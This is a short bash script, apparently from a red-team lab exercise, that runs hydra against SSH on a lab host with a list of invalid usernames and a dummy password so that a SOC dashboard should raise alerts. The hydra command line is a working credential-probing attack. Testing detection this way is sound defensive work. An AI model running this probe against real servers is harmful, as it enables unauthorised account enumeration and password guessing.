#!/bin/bash
# ==============================================================================
# Script: 02_user_enumeration.sh
# MITRE ATT&CK: T1110 - Account Enumeration / Invalid User Probing
# Target: Web-Server (10.10.10.30) or SOC-Server (10.10.10.10)
# ==============================================================================

TARGET_IP="${1:-10.10.10.30}"
USERS_FILE="wordlists/invalid_users.txt"
DUMMY_PASS="AuditTestPassword123!"

BLUE='\033[0;34m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${BLUE}====================================================${NC}"
echo -e "${YELLOW}[!] RED TEAM ATTACK SIMULATION: MITRE T1110${NC}"
echo -e "${BLUE}====================================================${NC}"
echo -e "[*] Attack Type     : SSH User Account Enumeration"
echo -e "[*] Target Host     : ${TARGET_IP}"
echo -e "[*] User List       : ${USERS_FILE}"
echo -e "[*] Probing Password: ${DUMMY_PASS}"
echo -e "[*] Expected Alert  : Repeated 'Invalid user' in /var/log/auth.log"
echo -e "${BLUE}====================================================${NC}"

if [ ! -f "$USERS_FILE" ]; then
    echo -e "${RED}[ERROR] Wordlist $USERS_FILE not found!${NC}"
    exit 1
fi

echo -e "\n${GREEN}[+] Launching User Account Enumeration probe...${NC}\n"
hydra -L "$USERS_FILE" -p "$DUMMY_PASS" ssh://"$TARGET_IP" -t 4 -V -I

echo -e "\n${BLUE}====================================================${NC}"
echo -e "${GREEN}[✔] Simulation completed.${NC}"
echo -e "[*] Inform Member 1 to verify alert: MITRE T1110 (User Probing) on SOC Dashboard."
echo -e "${BLUE}====================================================${NC}"
